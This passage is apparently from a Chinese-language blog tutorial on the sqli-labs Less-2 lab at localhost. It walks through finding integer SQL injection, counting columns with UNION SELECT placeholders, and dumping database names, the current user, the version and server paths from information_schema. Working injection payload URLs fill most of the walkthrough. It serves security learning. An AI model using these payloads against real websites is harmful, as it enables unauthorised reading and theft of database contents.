&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#如果是整型注入，加入单引号会报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; limit 0,1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#如果是单引号注入，加入单引号也会报错&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;select username,password from user where id = &amp;#x27;&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt; limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;据目前输入的结果来看，此网页存在“整型注入”或者“单引号注入”&lt;/p&gt;
&lt;h4 id=&#34;3-输入的SQL语句能否不报错&#34;&gt;&lt;a href=&#34;#3-输入的SQL语句能否不报错&#34; class=&#34;headerlink&#34; title=&#34;3)输入的SQL语句能否不报错&#34;&gt;&lt;/a&gt;3)输入的SQL语句能否不报错&lt;/h4&gt;&lt;p&gt;为了查看我们的语句能够成功闭合&lt;/p&gt;
&lt;p&gt;那怎么区分到底是整型还是单引号呢？&lt;/p&gt;
&lt;p&gt;使用 # 来注释后面语句&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#加入#号后，两个语法依旧错误，故都会报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; # limit 0,1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;select username,password from user where id = &amp;#x27;&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; #&amp;#x27;&lt;/span&gt; limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;结果确实是报错。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928220327744.png&#34; alt=&#34;image-20220928220327744&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来我们删掉单引号&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#如果是整型注入，则删掉单引号，保留#号后，不会报错！&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; # limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#如果是单引号注入，则删掉单引号，保留#号后，依旧会报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;2 #&amp;#x27;&lt;/span&gt; limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928220529170.png&#34; alt=&#34;image-20220928220529170&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;②什么类型的注入&#34;&gt;&lt;a href=&#34;#②什么类型的注入&#34; class=&#34;headerlink&#34; title=&#34;②什么类型的注入&#34;&gt;&lt;/a&gt;②什么类型的注入&lt;/h3&gt;&lt;p&gt;因此，此处经过上述报错信息确定，存在&lt;strong&gt;整型注入&lt;/strong&gt;！&lt;/p&gt;
&lt;h3 id=&#34;③语句是否能够被恶意修改&#34;&gt;&lt;a href=&#34;#③语句是否能够被恶意修改&#34; class=&#34;headerlink&#34; title=&#34;③语句是否能够被恶意修改&#34;&gt;&lt;/a&gt;③语句是否能够被恶意修改&lt;/h3&gt;&lt;p&gt;恶意修改主要指能否再加入一些我们想要的判断条件，比如：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;# limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果是整型注入无误，这里条件为“id = 2 and 0”——这是永假条件，则不会有任何查询结果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928221547372.png&#34; alt=&#34;image-20220928221547372&#34;&gt;&lt;/p&gt;
&lt;p&gt;结果正如我们所料，空空如也。&lt;/p&gt;
&lt;h3 id=&#34;④是否能够成功执行&#34;&gt;&lt;a href=&#34;#④是否能够成功执行&#34; class=&#34;headerlink&#34; title=&#34;④是否能够成功执行&#34;&gt;&lt;/a&gt;④是否能够成功执行&lt;/h3&gt;&lt;p&gt;第三个能满足，其实第四个就顺带就OK。&lt;/p&gt;
&lt;h3 id=&#34;⑤获取我们想要的数据&#34;&gt;&lt;a href=&#34;#⑤获取我们想要的数据&#34; class=&#34;headerlink&#34; title=&#34;⑤获取我们想要的数据&#34;&gt;&lt;/a&gt;⑤获取我们想要的数据&lt;/h3&gt;&lt;p&gt;关键数据是保存在数据库里面的，关系如下：&lt;/p&gt;
&lt;p&gt;数据库-&amp;gt;表-&amp;gt;字段-&amp;gt;值&lt;/p&gt;
&lt;p&gt;打开MySQL，我们可以看到其中有information_schema库（这是MySQL自带的库，管理所有表信息）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928223622076.png&#34; alt=&#34;image-20220928223622076&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个库中有三个表非常值得我们关注：&lt;/p&gt;
&lt;p&gt;Schemata表（包含所有的&lt;code&gt;库名信息&lt;/code&gt;）、Tables表（包含所有的&lt;code&gt;表名信息&lt;/code&gt;）、Columns表（包含所有的&lt;code&gt;列名信息&lt;/code&gt;）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;首先是Schemeta表&lt;/strong&gt;，&lt;code&gt;schema_name&lt;/code&gt;对应着所有数据库的名字。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928224006640.png&#34; alt=&#34;image-20220928224006640&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;其次是Tables表&lt;/strong&gt;，&lt;code&gt;table_name&lt;/code&gt;这个列里，存储了&lt;code&gt;table_schema对应的库&lt;/code&gt;下面的所有表&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928224135720.png&#34; alt=&#34;image-20220928224135720&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最后是Columns表&lt;/strong&gt;，通过&lt;code&gt;table_schema&lt;/code&gt;对应的库，&lt;code&gt;table_name&lt;/code&gt;对应的表，&lt;strong&gt;使用column_name对应的列名，来唯一地定位某个列&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928224405698.png&#34; alt=&#34;image-20220928224405698&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;1）构造联合查询&#34;&gt;&lt;a href=&#34;#1）构造联合查询&#34; class=&#34;headerlink&#34; title=&#34;1）构造联合查询&#34;&gt;&lt;/a&gt;1）构造联合查询&lt;/h4&gt;&lt;p&gt;确定的整型注入中，我们需要构造出我们想要的查询内容，比如在&lt;strong&gt;information_schema库&lt;/strong&gt;的&lt;strong&gt;Schema表&lt;/strong&gt;中获取&lt;code&gt;schema_name&lt;/code&gt;：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225341595.png&#34; alt=&#34;image-20220928225341595&#34;&gt;&lt;/p&gt;
&lt;p&gt;但如果像上面这样构造，会报错，我们需要使用到联合查询。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225106827.png&#34; alt=&#34;image-20220928225106827&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是，如果像上面这样构造，依旧会报错，在SQL查询中，union前后的两个列++&lt;strong&gt;需要列数完全一致才可拼接&lt;/strong&gt;++。&lt;/p&gt;
&lt;p&gt;因此，需要使用占位符来定位前面的查询是多少列：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#占位一个，后面的代码用#注释掉&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#占位两个，后面的代码用#注释掉&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#占位三个，后面的代码用#注释掉&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;....&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意，这里的1,2,3可以填任何数字或者符号，仅仅为了占位使用，&lt;strong&gt;可以被任意“想要看到的输出内容”覆盖&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;经过多次定位，我们最终得到：&lt;strong&gt;前面的查询&lt;/strong&gt;使用到的是&lt;strong&gt;3个列&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225313035.png&#34; alt=&#34;image-20220928225313035&#34;&gt;&lt;/p&gt;
&lt;p&gt;因此有：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225608030.png&#34; alt=&#34;image-20220928225608030&#34;&gt;&lt;/p&gt;
&lt;p&gt;虽然正确显示，但是我们查询的内容并没有显示出来。这是因为，使用union查询，&lt;strong&gt;还有个bug&lt;/strong&gt;就是如果前面的查询有效，&lt;strong&gt;最终结果会在前面查询到的结尾后面拼接&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;为了让后面查询到的内容（我们&lt;code&gt;想要看到的数据&lt;/code&gt;）提前，&lt;strong&gt;我们需要令前面的查询失效&lt;/strong&gt;，简单的方法就是令id = 39888 这样平常不会使用的奇怪数字：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225926603.png&#34; alt=&#34;image-20220928225926603&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;2）拼接多组内容在同一行输出、寻找所在库&#34;&gt;&lt;a href=&#34;#2）拼接多组内容在同一行输出、寻找所在库&#34; class=&#34;headerlink&#34; title=&#34;2）拼接多组内容在同一行输出、寻找所在库&#34;&gt;&lt;/a&gt;2）拼接多组内容在同一行输出、寻找所在库&lt;/h4&gt;&lt;p&gt;OK，我们在第二个占位符（也就是数字2所在的位置）上，看到输出了一个schema_name，但是我们想要输出所有的schema_name，怎么办？&lt;/p&gt;
&lt;p&gt;使用MySQL 查询语句提供的group_concat()函数&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(schema_name), schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到，原本占位符2所在的位置，已经被一组输出内容所替换。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928230746841.png&#34; alt=&#34;image-20220928230746841&#34;&gt;&lt;/p&gt;
&lt;p&gt;除了group_concat()，我们还可以使用：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#输出当前使用数据库的名称&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;database() &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出当前服务器中使用数据库的用户的名字和其对应的主机&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出当前数据库版本号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;version()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出该服务器数据库安装路径（数据库安装在哪里）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;variable&#34;&gt;@basedir&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出数据库中数据的存放路径（该存放路径下有各个数据库的数据、数据库中表的数据）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;variable&#34;&gt;@datadir&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#输出操作系统的版本号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;variable&#34;&gt;@version&lt;/span&gt;_compile_os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#md5(str)可以对传入的字符串进行，d5加密，并返回加密后得到的&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;位字符串。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;md5(&lt;span class=&#34;string&#34;&gt;&amp;#x27;xxxx&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#使用某个拼接符如“:”来拼接str1和str2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;concat_ws(&lt;span class=&#34;string&#34;&gt;&amp;#x27;:&amp;#x27;&lt;/span&gt;, str1, str2)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接着我们查询所在数据库的名字：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(schema_name), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;哦，原来是在security数据库中&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928231402676.png&#34; alt=&#34;image-20220928231402676&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;3）确定想从某个库中拿到什么表，从表中拿到什么列&#34;&gt;&lt;a href=&#34;#3）确定想从某个库中拿到什么表，从表中拿到什么列&#34; class=&#34;headerlink&#34; title=&#34;3）确定想从某个库中拿到什么表，从表中拿到什么列&#34;&gt;&lt;/a&gt;3）确定想从某个库中拿到什么表，从表中拿到什么列&lt;/h4&gt;&lt;p&gt;我们看看从security库中都可以读取什么表？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;核心&lt;/strong&gt;——在&lt;strong&gt;information_schema库&lt;/strong&gt;的&lt;strong&gt;Tables表&lt;/strong&gt;中，查询当table_schema的值为我们刚刚获取的security库时 &lt;/p&gt;
